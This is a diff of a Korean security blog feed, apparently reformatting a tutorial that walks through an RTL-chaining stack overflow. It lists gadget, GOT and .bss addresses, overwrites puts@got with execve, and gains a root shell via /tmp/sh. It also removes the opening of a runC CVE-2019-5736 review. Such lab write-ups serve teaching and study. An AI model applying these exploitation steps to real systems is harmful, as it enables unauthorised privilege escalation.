 &lt;p&gt;먼저 버퍼의 크기가 할당된 다음인 +25 라인에 브레이크를 걸어주고 실행 시키킵니다. 그 후에 &lt;strong&gt;EBP&lt;/strong&gt;에서 &lt;strong&gt;EAX&lt;/strong&gt;의 값을 빼주면 해당 값이 버퍼의 크기가 됩니다. 프로그램을 run 시켜주고 브레이크에 잡혀있는 main+25의 위치에서 &lt;strong&gt;EBP&lt;/strong&gt;와 &lt;strong&gt;EAX&lt;/strong&gt;를 확인후 앞서 말헀듯  &lt;strong&gt;EBP -&lt;/strong&gt; &lt;strong&gt;EAX&lt;/strong&gt;를 해줍시다&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-12.png&quot; alt=&quot;[그림 5-12]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;0xbf96a168 - 0xbf96a14c = &lt;strong&gt;0x1c&lt;/strong&gt;입니다. &lt;strong&gt;1c&lt;/strong&gt;는 &lt;strong&gt;28&lt;/strong&gt;이며 잉여값 4를 플러스 해 줍니다. 최종적으로 Buffer의 크기는 28 + 4하여 &lt;strong&gt;32byte&lt;/strong&gt;가 되겠습니다.&lt;/p&gt;
@@ -963,25 +1150,44 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;p&gt;그럼 지금까지 찾은 정보들을 확인해보겟습니다.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;buffer 크기 : &lt;strong&gt;32byte&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;strcpy() 주소 : &lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;execve() 주소 : &lt;strong&gt;0x43814550&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;PPR 주소 : &lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;.BSS 주소 : &lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;puts@plt 주소 : &lt;strong&gt;0x08048320&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;puts@got 주소 : &lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;/tmp/sh\x00 주소 :&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;buffer 크기 : &lt;strong&gt;32byte&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;strcpy() 주소 : &lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;execve() 주소 : &lt;strong&gt;0x43814550&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PPR 주소 : &lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;.BSS 주소 : &lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;puts@plt 주소 : &lt;strong&gt;0x08048320&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;puts@got 주소 : &lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;/tmp/sh\x00 주소 :&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;이제 필요한 정보들을 어느정도 모았습니다. 이 정보들을 활용해서 shell을 따도록 합시다.&lt;/p&gt;
 
 &lt;p&gt;먼저 &lt;strong&gt;data&lt;/strong&gt;영역의 &lt;strong&gt;puts@got&lt;/strong&gt;에 &lt;strong&gt;execve()&lt;/strong&gt; 함수의 주소를 저장해줘야 합니다. &lt;strong&gt;execve()&lt;/strong&gt;의 주소는 &lt;strong&gt;0x43814550&lt;/strong&gt;이지만 그대로 저장시키면 안되며 각 주소의 &lt;strong&gt;4byte&lt;/strong&gt;씩을 나눠서 저장해야 합니다. 즉 &lt;strong&gt;0x 43 81 45 50&lt;/strong&gt;이런식으로 잘라서 각각 &lt;strong&gt;4byte&lt;/strong&gt;의 주소값을 별도로 구해야 합니다.&lt;/p&gt;
 
-&lt;p&gt;무슨 개똥같은 말이냐면 &lt;strong&gt;\x43&lt;/strong&gt;이라는 문자열의 주소 &lt;strong&gt;\x81&lt;/strong&gt;이라는 문자열의 주소와 같이 각 자리를 &lt;strong&gt;문자열로 취급&lt;/strong&gt;하여 해당 문자열의 주소값을 찾아야 하는겁니다. 
-같은 방식으로 &lt;strong&gt;“/tmp/sh\x00”&lt;/strong&gt;도 각각의 문자열의 주소를 찾아야 하니 참고하시면 됩니다.(‘/’, ‘t’, ‘m’, ‘p’, ‘s’, ‘h’, ‘\x00’ 과 같이 구해야 합니다……)&lt;/p&gt;
+&lt;p&gt;무슨 개똥같은 말이냐면 &lt;strong&gt;\x43&lt;/strong&gt;이라는 문자열의 주소 &lt;strong&gt;\x81&lt;/strong&gt;이라는 문자열의 주소와 같이 각 자리를 &lt;strong&gt;문자열로 취급&lt;/strong&gt;하여 해당 문자열의 주소값을 찾아야 하는겁니다.&lt;/p&gt;
+
+&lt;p&gt;같은 방식으로 &lt;strong&gt;“/tmp/sh\x00”&lt;/strong&gt;도 각각의 문자열의 주소를 찾아야 하니 참고하시면 됩니다.(‘/’, ‘t’, ‘m’, ‘p’, ‘s’, ‘h’, ‘\x00’ 과 같이 구해야 합니다……)&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-13.png&quot; alt=&quot;[그림 5-13]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;앞에서 &lt;strong&gt;info files&lt;/strong&gt; 에서 나왔던 첫 주소값부터 &lt;strong&gt;.bss&lt;/strong&gt; 주소값까지를 사용하셔도 되고 &lt;strong&gt;/proc/self/maps&lt;/strong&gt;의 주소값을 찾으셔도 됩니다. 주의점은 위 그림처럼 나오는 주소중에 똑바로 안되는 주소도 있으며 오른쪽에 추가적인 내용이 없는 주소를 사용 하시면 됩니다.(저는 info files로 확인한 주소를 사용했습니다.)&lt;/p&gt;
@@ -989,33 +1195,51 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;p&gt;또한 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값을 &lt;strong&gt;puts@got&lt;/strong&gt;에 저장하기 위해 페이로드 작성시 기존의 리틀엔디안으로 입력했던 방식과는 다르게 이번엔 두 번 뒤집어주면 됩니다. 리틀엔디언의 리틀엔디언으로 입력해주시면 됩니다. 쉽게말해 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값인 &lt;strong&gt;0x43814550&lt;/strong&gt;의 각 &lt;strong&gt;4byte&lt;/strong&gt; 주소값을 입력할 때는 다시 역순으로 해주시면 됩니다. &lt;strong&gt;50&lt;/strong&gt;의 주소를 먼저 다음은 &lt;strong&gt;45&lt;/strong&gt; &lt;strong&gt;81&lt;/strong&gt; &lt;strong&gt;43&lt;/strong&gt; 순으로 입력하는것이죠. 다시 말하지만 페이로드 작성할 때를 말씀드리는 겁니다. 계속 해서 각각의 주소값을 구하면 다음과 같습니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-14.png&quot; alt=&quot;[그림 5-14]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;&lt;strong&gt;puts@got&lt;/strong&gt;에 &lt;strong&gt;execve()&lt;/strong&gt;의 주소를 저장하기 위한 준비가 끝났습니다. 실제로 해당 &lt;strong&gt;got&lt;/strong&gt; 위치에 &lt;strong&gt;execve()&lt;/strong&gt;의 주소가 박히는지 확인해 보겠습니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-15.png&quot; alt=&quot;[그림 5-15]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;우선 페이로드는 위 그림처럼 구성을 하시면 되겠습니다. 위에서 설명했던 &lt;strong&gt;RTL Chaining&lt;/strong&gt; 을 활용해서 첫 strcpy가 끝나면 다음 strcpy로 넘어가고, 두 번째 수행이 끝나면 세 번째 strcpy 함수로 쭉쭉 진행하게 됩니다. 진행하면서 &lt;strong&gt;puts@got[0]~[3]&lt;/strong&gt;까지 공간에 &lt;strong&gt;execve()&lt;/strong&gt; 함수의 주소값을 의미하는 문자열의 주소값이 저장됩니다. 다시 조금더 보기 편하게 각 칸에  주소값을 입력해보겠습니다.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;strcpy() 주소 : &lt;span style=&quot;color:#FF0000&quot;&gt;&lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;PPR 주소 : &lt;span style=&quot;color:#3C78D8&quot;&gt;&lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;puts@got 주소 : &lt;span style=&quot;color:#03D025&quot;&gt;&lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;execve() 주소 : &lt;span style=&quot;color:#FF9900&quot;&gt;&lt;strong&gt;0x43814550 (0x08048018, 0x08048001, 0x0804805d, 0x08048277)&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;strcpy() 주소 : &lt;span style=&quot;color:#FF0000&quot;&gt;&lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PPR 주소 : &lt;span style=&quot;color:#3C78D8&quot;&gt;&lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;puts@got 주소 : &lt;span style=&quot;color:#03D025&quot;&gt;&lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;execve() 주소 : &lt;span style=&quot;color:#FF9900&quot;&gt;&lt;strong&gt;0x43814550 (0x08048018, 0x08048001, 0x0804805d, 0x08048277)&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-16.png&quot; alt=&quot;[그림 5-16]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;페이로드는 이렇게 구성 되겠습니다. 직접 때려보고 &lt;strong&gt;got&lt;/strong&gt;에 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값 &lt;strong&gt;0x43814550&lt;/strong&gt;이 잘 박혀있나 확인 해보겠습니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-17.png&quot; alt=&quot;[그림 5-17]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;&lt;strong&gt;puts@got&lt;/strong&gt;시작 주소인 [0] 주소를 까보면 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값인 &lt;strong&gt;0x43814550&lt;/strong&gt;이 잘 박혀있는것을 확인할 수 있습니다.&lt;/p&gt;
@@ -1025,72 +1249,116 @@ chunk 자체가 단일 mmap() 시스템 콜을 통해 할당되었을 때 셋팅
 &lt;p&gt;이번엔 &lt;strong&gt;.bss&lt;/strong&gt;영역에 이전 포스팅에서 작성했던 &lt;strong&gt;setuid를 세팅해주는 스크립트&lt;/strong&gt;의 경로와 마지막 null값까지 포함한 ‘&lt;strong&gt;/tmp/sh\x00&lt;/strong&gt;‘의 각 문자의 주소를 따보도록 하겠습니다. 주소를 따는 방법은 위에서와 동일 하지만 리틀엔디안의 리틀엔디안같은 똥같은 짓은 안하셔도 됩니다. 기존에 하던 방식처럼 리틀엔디언을 한 번만 생각해주시면 됩니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-18.png&quot; alt=&quot;[그림 5-18]&quot; /&gt;
+
 &lt;/figure&gt;
 
-&lt;p&gt;각 문자열의 주소값은 위 그림과 같습니다. 다시 말씀드리지만 주소값 찾는 방법은 위에서 찾은 방법과 동일합니다. 다만, 제가 찾은 문자열의 주소와 다를 경우 안되는 경우도 있습니다. 이런 노가다성 작업을 하고서는 최종 페이로드 작성하고 공격했는데 실해하면 상당히 멘붕입니다. 별다른 단서가 없기에 다시 노가다 하는 방법밖에 없죠….(툴이 있긴 합니다. 편하고 편한….)
-저와 같은 삽질은 없으시길 바랍니다.(연속된 삽질로 숙련된 삽퍼가 되긴 합니다. 의도하지 않은 삽질로 이것저것 이해가 되는….비추입니다.)&lt;/p&gt;
+&lt;p&gt;각 문자열의 주소값은 위 그림과 같습니다. 다시 말씀드리지만 주소값 찾는 방법은 위에서 찾은 방법과 동일합니다. 다만, 제가 찾은 문자열의 주소와 다를 경우 안되는 경우도 있습니다. 이런 노가다성 작업을 하고서는 최종 페이로드 작성하고 공격했는데 실해하면 상당히 멘붕입니다. 별다른 단서가 없기에 다시 노가다 하는 방법밖에 없죠….(툴이 있긴 합니다. 편하고 편한….)&lt;/p&gt;
+
+&lt;p&gt;저와 같은 삽질은 없으시길 바랍니다.(연속된 삽질로 숙련된 삽퍼가 되긴 합니다. 의도하지 않은 삽질로 이것저것 이해가 되는….비추입니다.)&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-19.png&quot; alt=&quot;[그림 5-19]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;페이로드는 위와 같이 구성되며 마찬가지로 각 주소값을 입력하면 다음과 같습니다.&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;strcpy() 주소 : &lt;span style=&quot;color:#FF0000&quot;&gt;&lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;PPR 주소 : &lt;span style=&quot;color:#3C78D8&quot;&gt;&lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;.BSS 주소 : &lt;span style=&quot;color:#FF00FF&quot;&gt;&lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;/tmp/sh\x00 주소 : &lt;span style=&quot;color:#9900FF&quot;&gt;&lt;strong&gt;0x08048154, 0x080480f6, 0x0804825f, 0x0804824a, 0x08048154, 0x08048162, 0x080480d8, 0x08048007&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;strcpy() 주소 : &lt;span style=&quot;color:#FF0000&quot;&gt;&lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PPR 주소 : &lt;span style=&quot;color:#3C78D8&quot;&gt;&lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;.BSS 주소 : &lt;span style=&quot;color:#FF00FF&quot;&gt;&lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;/tmp/sh\x00 주소 : &lt;span style=&quot;color:#9900FF&quot;&gt;&lt;strong&gt;0x08048154, 0x080480f6, 0x0804825f, 0x0804824a, 0x08048154, 0x08048162, 0x080480d8, 0x08048007&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-20.png&quot; alt=&quot;[그림 5-20]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;실제 페이로드는 위와 같으며 이것도 마찬가지로 /tmp/sh\x00이 잘 박혀있나 확인 해봅시다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-21.png&quot; alt=&quot;[그림 5-21]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;&lt;strong&gt;.bss&lt;/strong&gt;의 첫 추소를 검색해보면…..나이스ㅠ…..\x00은 null로 인식되어 우리가 원하는 &lt;strong&gt;/tmp/sh&lt;/strong&gt; 문자열이 잘 박혀있습니다.&lt;/p&gt;
 
 &lt;p&gt;이제 99%입니다. 1% 채우고 개…아니 &lt;strong&gt;root shell&lt;/strong&gt; 따고 종료 합시다!!!!&lt;/p&gt;
 
-&lt;p&gt;이제 남은건 &lt;strong&gt;puts@plt&lt;/strong&gt;를 호출하고 &lt;strong&gt;execve()&lt;/strong&gt;의 인자값으로 “&lt;strong&gt;/tmp/sh&lt;/strong&gt;“를 넘겨주면 뙇씌!!!(작업이 끝나감에 신이 났습니다.)
-바로 하도록 하겠습니다. 위에서 만든 두개의 페이로드를 합쳐 주시고 제일 뒤쪽에 &lt;strong&gt;puts@plt&lt;/strong&gt; 호출 및 인자 전달을 위한 &lt;strong&gt;.bss&lt;/strong&gt;의 첫 주소를 박아주면 되겠습니다.&lt;/p&gt;
+&lt;p&gt;이제 남은건 &lt;strong&gt;puts@plt&lt;/strong&gt;를 호출하고 &lt;strong&gt;execve()&lt;/strong&gt;의 인자값으로 “&lt;strong&gt;/tmp/sh&lt;/strong&gt;“를 넘겨주면 뙇씌!!!(작업이 끝나감에 신이 났습니다.)&lt;/p&gt;
+
+&lt;p&gt;바로 하도록 하겠습니다. 위에서 만든 두개의 페이로드를 합쳐 주시고 제일 뒤쪽에 &lt;strong&gt;puts@plt&lt;/strong&gt; 호출 및 인자 전달을 위한 &lt;strong&gt;.bss&lt;/strong&gt;의 첫 주소를 박아주면 되겠습니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-22.png&quot; alt=&quot;[그림 5-22]&quot; /&gt;
+
 &lt;/figure&gt;
 
-&lt;p&gt;전체적인 페이로드는 이런 모습으로 구성 될 것입니다. 제일 아래쪽 &lt;strong&gt;puts@plt&lt;/strong&gt; 라인을 추가하여 &lt;strong&gt;puts@plt&lt;/strong&gt;를 호출하여 &lt;strong&gt;puts@got&lt;/strong&gt;에 저장된 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값을 호출하며 &lt;strong&gt;execve()&lt;/strong&gt;의 인자값으로 &lt;strong&gt;.bss[0]&lt;/strong&gt;의 주소를 넘겨주어 최종적으로 &lt;strong&gt;/tmp/sh&lt;/strong&gt;가 실행 되도록 하는 구성입니다.
-(&lt;strong&gt;execve()&lt;/strong&gt;를 이용해서 &lt;strong&gt;/tmp/sh&lt;/strong&gt;를 실행시키는 과정입니다.)&lt;/p&gt;
+&lt;p&gt;전체적인 페이로드는 이런 모습으로 구성 될 것입니다. 제일 아래쪽 &lt;strong&gt;puts@plt&lt;/strong&gt; 라인을 추가하여 &lt;strong&gt;puts@plt&lt;/strong&gt;를 호출하여 &lt;strong&gt;puts@got&lt;/strong&gt;에 저장된 &lt;strong&gt;execve()&lt;/strong&gt;의 주소값을 호출하며 &lt;strong&gt;execve()&lt;/strong&gt;의 인자값으로 &lt;strong&gt;.bss[0]&lt;/strong&gt;의 주소를 넘겨주어 최종적으로 &lt;strong&gt;/tmp/sh&lt;/strong&gt;가 실행 되도록 하는 구성입니다.&lt;/p&gt;
+
+&lt;p&gt;(&lt;strong&gt;execve()&lt;/strong&gt;를 이용해서 &lt;strong&gt;/tmp/sh&lt;/strong&gt;를 실행시키는 과정입니다.)&lt;/p&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/li&gt;
-  &lt;li&gt;strcpy() 주소 : &lt;span style=&quot;color:#FF0000&quot;&gt;&lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;PPR 주소 : &lt;span style=&quot;color:#3C78D8&quot;&gt;&lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;puts@got 주소 : &lt;span style=&quot;color:#03D025&quot;&gt;&lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;execve() 주소 : &lt;span style=&quot;color:#FF9900&quot;&gt;&lt;strong&gt;0x43814550 (0x08048018, 0x08048001, 0x0804805d, 0x08048277)&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;.BSS 주소 : &lt;span style=&quot;color:#FF00FF&quot;&gt;&lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;/tmp/sh\x00 주소 : &lt;span style=&quot;color:#9900FF&quot;&gt;&lt;strong&gt;0x08048154, 0x080480f6, 0x0804825f, 0x0804824a, 0x08048154, 0x08048162, 0x080480d8, 0x08048007&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
-  &lt;li&gt;puts@plt 주소 : &lt;span style=&quot;color:#0097A7&quot;&gt;&lt;strong&gt;0x08048320&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;buffer 크기 : &lt;strong&gt;32byte (“AAAA”*8)&lt;/strong&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;strcpy() 주소 : &lt;span style=&quot;color:#FF0000&quot;&gt;&lt;strong&gt;0x08048310&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;PPR 주소 : &lt;span style=&quot;color:#3C78D8&quot;&gt;&lt;strong&gt;0x080484fe&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;puts@got 주소 : &lt;span style=&quot;color:#03D025&quot;&gt;&lt;strong&gt;0x0804a010&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;execve() 주소 : &lt;span style=&quot;color:#FF9900&quot;&gt;&lt;strong&gt;0x43814550 (0x08048018, 0x08048001, 0x0804805d, 0x08048277)&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;.BSS 주소 : &lt;span style=&quot;color:#FF00FF&quot;&gt;&lt;strong&gt;0x0804a030&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;/tmp/sh\x00 주소 : &lt;span style=&quot;color:#9900FF&quot;&gt;&lt;strong&gt;0x08048154, 0x080480f6, 0x0804825f, 0x0804824a, 0x08048154, 0x08048162, 0x080480d8, 0x08048007&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;puts@plt 주소 : &lt;span style=&quot;color:#0097A7&quot;&gt;&lt;strong&gt;0x08048320&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
+  &lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-23.png&quot; alt=&quot;[그림 5-23]&quot; /&gt;
+
 &lt;/figure&gt;
 
-&lt;p&gt;최종 페이로드 구성입니다. 설명도 위쪽에 이미 전부 했기에 바로 떄리고 확인 해보겠슴돠!
-(그나저나 알록달록 이쁘게 뽑힌듯 합니다…흐뭇…)&lt;/p&gt;
+&lt;p&gt;최종 페이로드 구성입니다. 설명도 위쪽에 이미 전부 했기에 바로 떄리고 확인 해보겠슴돠!&lt;/p&gt;
+
+&lt;p&gt;(그나저나 알록달록 이쁘게 뽑힌듯 합니다…흐뭇…)&lt;/p&gt;
 
 &lt;p&gt;root 계정이 아닌 일반 계정으로 바꾼 후 위의 페이로드를 떄리겠습니다.&lt;/p&gt;
 
 &lt;figure&gt;
+
   &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/0x05/0x05-24.png&quot; alt=&quot;[그림 5-24]&quot; /&gt;
+
 &lt;/figure&gt;
 
 &lt;p&gt;짜잔….uid가 개…root로 잡혀있는것을 확인 가능합니다.(&lt;strong&gt;Sulla&lt;/strong&gt;는 그냥 제 닉이라서 제가 좋하는 주황색으로 그어봤습니닿)&lt;/p&gt;
@@ -2081,227 +2349,6 @@ sg.vantagepoint.uncrackable1.a class에서는 입력된 문자열과 암호를 �
 
       
         <summary type="html">Android 정적 분석</summary>
-      
-
-      
-      
-    </entry>
-  
-    <entry>
-      <title type="html">CVE-2019-5736 (runC Container 취약점)</title>
-      <link href="/runC-Container" rel="alternate" type="text/html" title="CVE-2019-5736 (runC Container 취약점)" />
-      <published>2019-03-28T02:43:00+09:00</published>
-      <updated>2019-03-28T02:43:00+09:00</updated>
-      <id>/runC%20Container</id>
-      <content type="html" xml:base="/runC-Container">&lt;h2 id=&quot;cve-2019-5736-runc-container-취약점&quot;&gt;CVE-2019-5736 (runC Container 취약점)&lt;/h2&gt;
-
-&lt;p&gt;안녕하세요. Sulla임돠!&lt;/p&gt;
-
-&lt;p&gt;2월 11일 &lt;strong&gt;docker&lt;/strong&gt;관련 런타임인 &lt;strong&gt;runC&lt;/strong&gt; 관련 취약점 &lt;strong&gt;CVE-2019-5736&lt;/strong&gt; 공개 되었습니다. 
-공개된지 1주일도 안지나 &lt;strong&gt;POC&lt;/strong&gt;가 공개되고 있으며, 영향력도 큰 취약점으로 많은 주목을 받고있습니다.&lt;/p&gt;
-
-&lt;p&gt;그래서 이번 포스팅에서는 해당 취약점에 대하여 리뷰해 보겠습니다.&lt;/p&gt;
-
-&lt;h2 id=&quot;본-포스팅에서는-환경-구축버전-등의-정보는-제외하겠습니다&quot;&gt;[&lt;strong&gt;본 포스팅에서는 환경 구축/버전 등의 정보는 제외하겠습니다.]&lt;/strong&gt;&lt;/h2&gt;
-
-&lt;p&gt;먼저 &lt;strong&gt;docker&lt;/strong&gt;가 뭔지…&lt;strong&gt;runC&lt;/strong&gt;가 뭔지에 대해서 알아야겠죠??언제나 그렇듯 최대한 간단하고 필요한 내용만 쉽게 알아보겠습니다.(&lt;strong&gt;귀차니즘&lt;/strong&gt; 아닙니다…..)&lt;/p&gt;
-
-&lt;p&gt;우선 &lt;strong&gt;docker&lt;/strong&gt;란 &lt;strong&gt;Linux&lt;/strong&gt; 기반의 &lt;strong&gt;container runtime 오픈소스 플랫폼&lt;/strong&gt; 입니다. 쉽게 말해 &lt;strong&gt;Container 관리 플랫폼&lt;/strong&gt;이며, &lt;strong&gt;VM&lt;/strong&gt;(Virtual Machine)과 비슷한 역할을 수행하지만 쉬운 배포 및 높은 확장성 등의 &lt;strong&gt;접근성&lt;/strong&gt;과 메모리 점유등의 &lt;strong&gt;성능&lt;/strong&gt;의 차이를 보입니다.(“&lt;strong&gt;가상화&lt;/strong&gt;“가 목표이긴 합니다.)&lt;/p&gt;
-
-&lt;figure&gt;
-  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/linux/jobs/runC_Container/5736-1.png&quot; alt=&quot;[그림 5736-1]&quot; /&gt;
-&lt;/figure&gt;
-
-&lt;p&gt;Docker의 기본 구성을 위 그림과 같이 표현했습니다. 각각의 역할을 알아 보겠습니다.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Docker Engine : 사용자와 상호작용을 합니다.&lt;/li&gt;
-  &lt;li&gt;Containerd : 직/간접적으로 호스트에서 컨테이너 전체 라이프 사이클을 관리합니다. (이미저 전송 및 저장, 컨테이너 실행 및 관리(runC 사용), 네트워크 인터페이스 관리 등)&lt;/li&gt;
-  &lt;li&gt;Containerd-shim : runC를 사용해 컨테이너를 시작된 후에 runC가 종료 되어도 컨테이너가 실행 되도록합니다.&lt;/li&gt;
